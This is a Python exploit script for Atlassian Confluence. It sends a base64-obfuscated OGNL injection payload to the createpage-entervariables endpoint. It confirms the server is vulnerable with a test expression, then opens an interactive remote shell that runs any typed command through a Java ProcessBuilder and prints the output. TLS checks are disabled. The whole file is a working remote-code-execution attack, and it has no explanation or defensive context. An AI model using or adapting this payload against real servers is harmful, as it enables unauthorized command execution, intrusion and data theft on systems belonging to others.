import requests
import base64
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

payload = """cXVlcnlTdHJpbmc9YWFhYWFhYWFcdTAwMjclMmJ7Q2xhc3MuZm9yTmFtZShcdTAwMjdqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlclx1MDAyNykubmV3SW5zdGFuY2UoKS5nZXRFbmdpbmVCeU5hbWUoXHUwMDI3SmF2YVNjcmlwdFx1MDAyNykuXHUwMDY1dmFsKFx1MDAyN3Zhcitpc1dpbislM2QramF2YS5sYW5nLlN5c3RlbS5nZXRQcm9wZXJ0eShcdTAwMjJvcy5uYW1lXHUwMDIyKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKFx1MDAyMndpblx1MDAyMiklM2IrdmFyK2NtZCslM2QrbmV3K2phdmEubGFuZy5TdHJpbmcoXHUwMDIyaWZjb25maWdcdTAwMjIpJTNidmFyK3ArJTNkK25ldytqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoKSUzYitpZihpc1dpbil7cC5jb21tYW5kKFx1MDAyMmNtZC5leGVcdTAwMjIsK1x1MDAyMi9jXHUwMDIyLCtjbWQpJTNiK30rZWxzZXtwLmNvbW1hbmQoXHUwMDIyYmFzaFx1MDAyMiwrXHUwMDIyLWNcdTAwMjIsK2NtZCklM2IrfXAucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKSUzYit2YXIrcHJvY2VzcyUzZCtwLnN0YXJ0KCklM2IrdmFyK2lucHV0U3RyZWFtUmVhZGVyKyUzZCtuZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlcihwcm9jZXNzLmdldElucHV0U3RyZWFtKCkpJTNiK3ZhcitidWZmZXJlZFJlYWRlcislM2QrbmV3K2phdmEuaW8uQnVmZmVyZWRSZWFkZXIoaW5wdXRTdHJlYW1SZWFkZXIpJTNiK3ZhcitsaW5lKyUzZCtcdTAwMjJcdTAwMjIlM2IrdmFyK291dHB1dCslM2QrXHUwMDIyXHUwMDIyJTNiK3doaWxlKChsaW5lKyUzZCtidWZmZXJlZFJlYWRlci5yZWFkTGluZSgpKSshJTNkK251bGwpe291dHB1dCslM2Qrb3V0cHV0KyUyYitsaW5lKyUyYitqYXZhLmxhbmcuQ2hhcmFjdGVyLnRvU3RyaW5nKDEwKSUzYit9XHUwMDI3KX0lMmJcdTAwMjdhYWFhYWFhYQ=="""
def exploit(url):
	endpoint = url + '/pages/createpage-entervariables.action?SpaceKey=x'
	#endpoint = url + '/pages/createpage.action?spaceKey=myproj' this endpoint you need sign up and login as user then create myproj
	p = "cXVlcnlTdHJpbmc9YWFhYVx1MDAyNyUyYiN7MyozMzN9JTJiXHUwMDI3YmJi"
	h = {
	"Content-Type": "application/x-www-form-urlencoded",
	"User-Agent": "Hello-World"
	}
	r = requests.post(endpoint, headers=h, data=base64.b64decode(p), verify=False)
	if r.status_code == 200 and "aaa{999=null}bbb" in r.text:
		while True:
			cmd = input("confluence@remote-shell> ")
			r = requests.post(endpoint, headers=h, data=base64.b64decode(payload).decode("utf-8").replace("ifconfig", cmd.encode().decode()), verify=False)
			if r.status_code==200:
				try:
					output = r.text.split("aaaaaaaa[")[1].split(']aaaaaaaa')[0]
					print(output)
				except:
					pass
	else:
		print(r)
		return False

exploit(sys.argv[1])
